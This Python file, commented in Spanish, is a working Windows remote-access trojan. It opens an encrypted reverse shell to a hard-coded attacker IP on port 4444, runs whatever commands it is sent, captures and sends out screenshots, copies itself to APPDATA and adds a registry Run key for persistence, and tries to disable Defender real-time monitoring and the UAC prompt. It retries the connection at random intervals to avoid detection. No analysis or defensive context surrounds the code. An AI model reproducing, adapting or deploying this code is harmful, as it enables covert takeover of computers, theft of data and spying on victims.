import socket
import subprocess
import os
import sys
import time
import pyautogui
import shutil
import base64
import ctypes
import threading
import random
import string
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# Configuración de conexión
HOST = "178.156.158.72"  # IP del atacante
PORT = 4444  # Puerto de escucha
KEY = b'S3cr3tK3y16Bytes'  # Clave para cifrado AES (16 bytes)

# Ruta dinámica para persistencia
RUTA_PERSISTENCIA = os.path.join(os.getenv("APPDATA"), ''.join(random.choices(string.ascii_letters, k=12)) + ".exe")

# Cifrado AES para comandos y respuestas
def cifrar_datos(datos):
    cipher = AES.new(KEY, AES.MODE_CBC)
    datos_cifrados = cipher.encrypt(pad(datos.encode(), AES.block_size))
    return base64.b64encode(cipher.iv + datos_cifrados).decode()

def descifrar_datos(datos_cifrados):
    datos = base64.b64decode(datos_cifrados)
    iv = datos[:16]
    cipher = AES.new(KEY, AES.MODE_CBC, iv=iv)
    return unpad(cipher.decrypt(datos[16:]), AES.block_size).decode()

# Ejecución de comandos silenciada
def ejecutar_comando(comando):
    return subprocess.getoutput(comando + " 2> nul" if os.name == "nt" else comando + " 2>/dev/null")

# Persistencia avanzada con nombre aleatorio
def agregar_persistencia():
    if not os.path.exists(RUTA_PERSISTENCIA):
        shutil.copy(sys.executable, RUTA_PERSISTENCIA)
        subprocess.run(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {random.randint(1000,9999)} /t REG_SZ /d "{RUTA_PERSISTENCIA}" /f', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Desactivar Defender y UAC sigilosamente
def desactivar_seguridad():
    try:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", "powershell", "Set-MpPreference -DisableRealtimeMonitoring $true; New-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin -Value 0 -Force", None, 0)
    except:
        pass

# Captura de pantalla comprimida
def capturar_pantalla(socket_cliente):
    img = pyautogui.screenshot()
    img.save("temp.png", optimize=True, quality=50)
    with open("temp.png", "rb") as f:
        socket_cliente.send(cifrar_datos(base64.b64encode(f.read()).decode()).encode())
    os.remove("temp.png")

# Conexión con reintentos aleatorios y cifrado
def conectar():
    while True:
        try:
            socket_cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket_cliente.connect((HOST, PORT))
            manejar_shell(socket_cliente)
        except:
            time.sleep(random.uniform(3, 10))  # Reintentos aleatorios para evitar detección

# Shell remota con manejo de errores
def manejar_shell(socket_cliente):
    while True:
        try:
            comando_cifrado = socket_cliente.recv(1024).decode()
            comando = descifrar_datos(comando_cifrado)
            if comando.lower() == "exit":
                break
            elif comando.lower() == "screenshot":
                capturar_pantalla(socket_cliente)
            else:
                resultado = ejecutar_comando(comando)
                socket_cliente.send(cifrar_datos(resultado).encode())
        except:
            break
    socket_cliente.close()
    conectar()

# Ejecución en segundo plano
def iniciar():
    threading.Thread(target=agregar_persistencia, daemon=True).start()
    threading.Thread(target=desactivar_seguridad, daemon=True).start()
    conectar()

if __name__ == "__main__":
    iniciar()